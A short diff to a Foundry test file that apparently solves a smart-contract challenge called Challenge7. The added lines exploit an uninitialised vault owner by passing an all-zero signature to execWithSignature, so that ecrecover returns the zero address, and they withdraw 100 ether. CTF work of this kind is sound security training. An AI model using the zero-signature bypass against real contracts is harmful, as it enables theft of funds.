@@ -46,8 +46,16 @@ contract Challenge7Test is Test {
         // forge test --match-contract Challenge7Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        // @audit vault owner is never set on initialize(). provide an invalid signature that will ecrecover 0x0 address, in the case of an error.
+        console.log("daoManager vault owner: %s", DaoVaultImplementation(payable(address(vault))).owner());
 
-
+        vault.execWithSignature(
+            0, 0, 0,  // zero v, r, s
+            daoManager, // call to address
+            100 ether, // value 100ether
+            "", // call without fuction selector
+            type(uint256).max // deadline
+        );
 
         //==================================================//
         vm.stopPrank();
